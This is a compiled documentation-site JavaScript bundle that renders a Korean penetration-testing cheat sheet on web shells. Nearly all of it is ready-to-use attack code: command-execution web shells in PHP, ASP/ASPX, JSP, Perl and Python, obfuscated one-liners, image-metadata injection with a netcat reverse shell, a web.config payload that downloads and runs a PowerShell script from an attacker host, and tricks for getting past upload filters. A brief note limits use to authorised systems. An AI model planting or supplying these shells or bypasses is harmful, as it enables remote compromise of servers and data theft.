"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[383],{7205:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>d,frontMatter:()=>t,metadata:()=>l,toc:()=>p});const l=JSON.parse('{"id":"Cheatsheet/payloads/web-shells","title":"Web Shells","description":"\uc6f9 \uc11c\ubc84\uc5d0 \uc5c5\ub85c\ub4dc\ud558\uc5ec \uba85\ub839\uc744 \uc2e4\ud589\ud560 \uc218 \uc788\ub294 \uc6f9\uc178\uc785\ub2c8\ub2e4.","source":"@site/docs/Cheatsheet/payloads/web-shells.md","sourceDirName":"Cheatsheet/payloads","slug":"/Cheatsheet/payloads/web-shells","permalink":"/my-docusaurus-page/Cheatsheet/payloads/web-shells","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":3,"frontMatter":{"sidebar_position":3},"sidebar":"tutorialSidebar","previous":{"title":"Reverse Shell Upgrade","permalink":"/my-docusaurus-page/Cheatsheet/payloads/reverse-shell-upgrade"},"next":{"title":"Wordlists","permalink":"/my-docusaurus-page/category/wordlists"}}');var i=s(4848),r=s(8453);const t={sidebar_position:3},a="Web Shells",c={},p=[{value:"PHP Web Shells",id:"php-web-shells",level:2},{value:"\uae30\ubcf8",id:"\uae30\ubcf8",level:3},{value:"GET \ud30c\ub77c\ubbf8\ud130",id:"get-\ud30c\ub77c\ubbf8\ud130",level:3},{value:"POST \ud30c\ub77c\ubbf8\ud130",id:"post-\ud30c\ub77c\ubbf8\ud130",level:3},{value:"REQUEST (GET/POST \ubaa8\ub450)",id:"request-getpost-\ubaa8\ub450",level:3},{value:"\ub2e4\uc591\ud55c \ud568\uc218",id:"\ub2e4\uc591\ud55c-\ud568\uc218",level:3},{value:"\ud55c \uc904 \uc6f9\uc178\ub4e4",id:"\ud55c-\uc904-\uc6f9\uc178\ub4e4",level:3},{value:"\ub09c\ub3c5\ud654\ub41c \uc6f9\uc178",id:"\ub09c\ub3c5\ud654\ub41c-\uc6f9\uc178",level:3},{value:"Exiftool\uc744 \uc774\uc6a9\ud55c \uc774\ubbf8\uc9c0 \uc8fc\uc785",id:"exiftool\uc744-\uc774\uc6a9\ud55c-\uc774\ubbf8\uc9c0-\uc8fc\uc785",level:3},{value:"ASP/ASPX Web Shells",id:"aspaspx-web-shells",level:2},{value:"Classic ASP",id:"classic-asp",level:3},{value:"ASPX",id:"aspx",level:3},{value:"ASPX Web.config",id:"aspx-webconfig",level:3},{value:"JSP Web Shells",id:"jsp-web-shells",level:2},{value:"\uae30\ubcf8",id:"\uae30\ubcf8-1",level:3},{value:"Java Runtime",id:"java-runtime",level:3},{value:"Perl Web Shells",id:"perl-web-shells",level:2},{value:"Python Web Shells",id:"python-web-shells",level:2},{value:"Flask",id:"flask",level:3},{value:"CGI",id:"cgi",level:3},{value:"\uc5c5\ub85c\ub4dc \uc6b0\ud68c \uae30\ubc95",id:"\uc5c5\ub85c\ub4dc-\uc6b0\ud68c-\uae30\ubc95",level:2},{value:"\ud30c\uc77c \ud655\uc7a5\uc790",id:"\ud30c\uc77c-\ud655\uc7a5\uc790",level:3},{value:"Content-Type \ubcc0\uc870",id:"content-type-\ubcc0\uc870",level:3},{value:"Magic Bytes \ucd94\uac00",id:"magic-bytes-\ucd94\uac00",level:3},{value:"\uc77c\ubc18\uc801\uc778 \uc6f9\uc178 \uc704\uce58",id:"\uc77c\ubc18\uc801\uc778-\uc6f9\uc178-\uc704\uce58",level:2},{value:"\uc0ac\uc6a9 \uc608\uc81c",id:"\uc0ac\uc6a9-\uc608\uc81c",level:2},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function h(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"web-shells",children:"Web Shells"})}),"\n",(0,i.jsx)(n.p,{children:"\uc6f9 \uc11c\ubc84\uc5d0 \uc5c5\ub85c\ub4dc\ud558\uc5ec \uba85\ub839\uc744 \uc2e4\ud589\ud560 \uc218 \uc788\ub294 \uc6f9\uc178\uc785\ub2c8\ub2e4."}),"\n",(0,i.jsx)(n.h2,{id:"php-web-shells",children:"PHP Web Shells"}),"\n",(0,i.jsx)(n.h3,{id:"\uae30\ubcf8",children:"\uae30\ubcf8"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"<?php system($_GET['cmd']); ?>\n"})}),"\n",(0,i.jsx)(n.h3,{id:"get-\ud30c\ub77c\ubbf8\ud130",children:"GET \ud30c\ub77c\ubbf8\ud130"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"<?php\nif(isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n}\n?>\n"})}),"\n",(0,i.jsx)(n.h3,{id:"post-\ud30c\ub77c\ubbf8\ud130",children:"POST \ud30c\ub77c\ubbf8\ud130"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"<?php echo exec($_POST['cmd']); ?>\n"})}),"\n",(0,i.jsx)(n.h3,{id:"request-getpost-\ubaa8\ub450",children:"REQUEST (GET/POST \ubaa8\ub450)"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"<?php passthru($_REQUEST['cmd']); ?>\n<?php echo system($_REQUEST['shell']); ?>\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\ub2e4\uc591\ud55c-\ud568\uc218",children:"\ub2e4\uc591\ud55c \ud568\uc218"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"# system\n<?php system($_GET['cmd']); ?>\n\n# exec\n<?php echo exec($_GET['cmd']); ?>\n\n# passthru\n<?php passthru($_GET['cmd']); ?>\n\n# shell_exec\n<?php echo shell_exec($_GET['cmd']); ?>\n\n# popen\n<?php\n$handle = popen($_GET['cmd'], 'r');\necho fread($handle, 2096);\npclose($handle);\n?>\n\n# proc_open\n<?php\n$descriptorspec = array(\n   0 => array(\"pipe\", \"r\"),\n   1 => array(\"pipe\", \"w\"),\n   2 => array(\"pipe\", \"w\")\n);\n$process = proc_open($_GET['cmd'], $descriptorspec, $pipes);\necho stream_get_contents($pipes[1]);\nproc_close($process);\n?>\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\ud55c-\uc904-\uc6f9\uc178\ub4e4",children:"\ud55c \uc904 \uc6f9\uc178\ub4e4"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"<?php @eval($_POST['cmd']); ?>\n<?php @system($_GET['c']); ?>\n<?=`$_GET[x]`?>\n<?=$_GET[0]($_GET[1]);?>\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\ub09c\ub3c5\ud654\ub41c-\uc6f9\uc178",children:"\ub09c\ub3c5\ud654\ub41c \uc6f9\uc178"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"<?php\n$a = $_GET['a'];\n$b = $_GET['b'];\n$a($b);\n?>\n// \uc0ac\uc6a9: shell.php?a=system&b=whoami\n"})}),"\n",(0,i.jsx)(n.h3,{id:"exiftool\uc744-\uc774\uc6a9\ud55c-\uc774\ubbf8\uc9c0-\uc8fc\uc785",children:"Exiftool\uc744 \uc774\uc6a9\ud55c \uc774\ubbf8\uc9c0 \uc8fc\uc785"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# JPG\nexiftool -Comment='<?php passthru(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f\"); ?>' shell.jpg\n\n# PNG\nexiftool -Comment='<?php echo \"<pre>\"; system($_GET['cmd']); ?>' shell.png\nexiftool \"-comment<=back.php\" back.png\n\n# JPEG\nexiv2 -c'A \"<?php system($_REQUEST['cmd']);?>\\\"!' shell.jpeg\n"})}),"\n",(0,i.jsx)(n.h2,{id:"aspaspx-web-shells",children:"ASP/ASPX Web Shells"}),"\n",(0,i.jsx)(n.h3,{id:"classic-asp",children:"Classic ASP"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-asp",children:'<%\nSet objShell = Server.CreateObject("WScript.Shell")\nSet objExec = objShell.Exec(Request.QueryString("cmd"))\nResponse.Write(objExec.StdOut.ReadAll())\n%>\n'})}),"\n",(0,i.jsx)(n.h3,{id:"aspx",children:"ASPX"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-aspx",children:'<%@ Page Language="C#" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<script runat="server">\nvoid Page_Load(object sender, EventArgs e)\n{\n    string cmd = Request.QueryString["cmd"];\n    Process p = new Process();\n    p.StartInfo.FileName = "cmd.exe";\n    p.StartInfo.Arguments = "/c " + cmd;\n    p.StartInfo.UseShellExecute = false;\n    p.StartInfo.RedirectStandardOutput = true;\n    p.Start();\n    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");\n}\n<\/script>\n'})}),"\n",(0,i.jsx)(n.h3,{id:"aspx-webconfig",children:"ASPX Web.config"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" encoding="UTF-8"?>\n<configuration>\n   <system.webServer>\n      <handlers accessPolicy="Read, Script, Write">\n         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />\n      </handlers>\n      <security>\n         <requestFiltering>\n            <fileExtensions>\n               <remove fileExtension=".config" />\n            </fileExtensions>\n            <hiddenSegments>\n               <remove segment="web.config" />\n            </hiddenSegments>\n         </requestFiltering>\n      </security>\n   </system.webServer>\n</configuration>\n\x3c!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!\n<%\nSet s = CreateObject("WScript.Shell")\nSet cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring(\'http://<LHOST>/payload.ps1\')")\no = cmd.StdOut.Readall()\nResponse.write(o)\n%>\n--\x3e\n'})}),"\n",(0,i.jsx)(n.h2,{id:"jsp-web-shells",children:"JSP Web Shells"}),"\n",(0,i.jsx)(n.h3,{id:"\uae30\ubcf8-1",children:"\uae30\ubcf8"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-jsp",children:'<%@ page import="java.io.*" %>\n<%\nString cmd = request.getParameter("cmd");\nProcess p = Runtime.getRuntime().exec(cmd);\nInputStream in = p.getInputStream();\nint i;\nwhile((i = in.read()) != -1) {\n    out.print((char)i);\n}\nin.close();\n%>\n'})}),"\n",(0,i.jsx)(n.h3,{id:"java-runtime",children:"Java Runtime"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-jsp",children:'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>\n'})}),"\n",(0,i.jsx)(n.h2,{id:"perl-web-shells",children:"Perl Web Shells"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-perl",children:"#!/usr/bin/perl\nprint \"Content-Type: text/html\\n\\n\";\nprint `$ENV{'QUERY_STRING'}`;\n"})}),"\n",(0,i.jsx)(n.h2,{id:"python-web-shells",children:"Python Web Shells"}),"\n",(0,i.jsx)(n.h3,{id:"flask",children:"Flask"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:"from flask import Flask, request\nimport os\n\napp = Flask(__name__)\n\n@app.route('/')\ndef shell():\n    cmd = request.args.get('cmd', '')\n    return os.popen(cmd).read()\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8080)\n"})}),"\n",(0,i.jsx)(n.h3,{id:"cgi",children:"CGI"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:"#!/usr/bin/env python\nimport cgi\nimport os\n\nform = cgi.FieldStorage()\ncmd = form.getvalue('cmd')\n\nprint(\"Content-Type: text/html\\n\")\nprint(os.popen(cmd).read())\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\uc5c5\ub85c\ub4dc-\uc6b0\ud68c-\uae30\ubc95",children:"\uc5c5\ub85c\ub4dc \uc6b0\ud68c \uae30\ubc95"}),"\n",(0,i.jsx)(n.h3,{id:"\ud30c\uc77c-\ud655\uc7a5\uc790",children:"\ud30c\uc77c \ud655\uc7a5\uc790"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"# PHP\n.php, .php3, .php4, .php5, .phtml, .phar\n.PhP, .Php5, .PhAr (\ub300\uc18c\ubb38\uc790 \ud63c\ud569)\n\n# ASP\n.asp, .aspx, .cer, .asa\n\n# JSP\n.jsp, .jspx\n\n# \uc774\uc911 \ud655\uc7a5\uc790\nshell.php.jpg\nshell.jpg.php\nshell.php%00.jpg (Null Byte, \uad6c\ud615 \uc2dc\uc2a4\ud15c)\n"})}),"\n",(0,i.jsx)(n.h3,{id:"content-type-\ubcc0\uc870",children:"Content-Type \ubcc0\uc870"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"# PHP \ud30c\uc77c\uc744 \uc774\ubbf8\uc9c0\ub85c\nContent-Type: image/jpeg\nContent-Type: image/png\nContent-Type: image/gif\n"})}),"\n",(0,i.jsx)(n.h3,{id:"magic-bytes-\ucd94\uac00",children:"Magic Bytes \ucd94\uac00"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# GIF89a\ub97c \ud30c\uc77c \uc55e\uc5d0 \ucd94\uac00\necho 'GIF89a' > shell.php\ncat original_shell.php >> shell.php\n\n# PNG\nprintf '\\x89\\x50\\x4E\\x47' > shell.php\ncat original_shell.php >> shell.php\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\uc77c\ubc18\uc801\uc778-\uc6f9\uc178-\uc704\uce58",children:"\uc77c\ubc18\uc801\uc778 \uc6f9\uc178 \uc704\uce58"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"# Linux\n/var/www/html/\n/var/www/\n/usr/share/nginx/html/\n/opt/lampp/htdocs/\n\n# Windows\nC:\\inetpub\\wwwroot\\\nC:\\xampp\\htdocs\\\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\uc0ac\uc6a9-\uc608\uc81c",children:"\uc0ac\uc6a9 \uc608\uc81c"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# PHP \uc6f9\uc178\ncurl http://<RHOST>/shell.php?cmd=whoami\ncurl http://<RHOST>/shell.php?cmd=id\ncurl -X POST http://<RHOST>/shell.php -d "cmd=ls -la"\n\n# ASPX \uc6f9\uc178\ncurl http://<RHOST>/shell.aspx?cmd=whoami\n'})}),"\n",(0,i.jsx)(n.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"\ud56d\uc0c1 \uad8c\ud55c\uc774 \uc788\ub294 \uc2dc\uc2a4\ud15c\uc5d0\uc11c\ub9cc \uc0ac\uc6a9"}),"\n",(0,i.jsx)(n.li,{children:"\uc5c5\ub85c\ub4dc \ud6c4 \uc989\uc2dc \uc81c\uac70 \uad8c\uc7a5"}),"\n",(0,i.jsx)(n.li,{children:"WAF \uc6b0\ud68c\ub97c \uc704\ud574 \ub09c\ub3c5\ud654 \uace0\ub824"}),"\n",(0,i.jsx)(n.li,{children:"Magic Bytes\ub85c \ud544\ud130 \uc6b0\ud68c \uac00\ub2a5"}),"\n",(0,i.jsx)(n.li,{children:"Null Byte\ub294 \uad6c\ud615 \uc2dc\uc2a4\ud15c\uc5d0\uc11c\ub9cc \uc791\ub3d9"}),"\n",(0,i.jsx)(n.li,{children:"Content-Type \uac80\uc99d\ub9cc \ud558\ub294 \uacbd\uc6b0 \uc27d\uac8c \uc6b0\ud68c \uac00\ub2a5"}),"\n"]})]})}function d(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(h,{...e})}):h(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>t,x:()=>a});var l=s(6540);const i={},r=l.createContext(i);function t(e){const n=l.useContext(r);return l.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:t(e.components),l.createElement(r.Provider,{value:n},e.children)}}}]);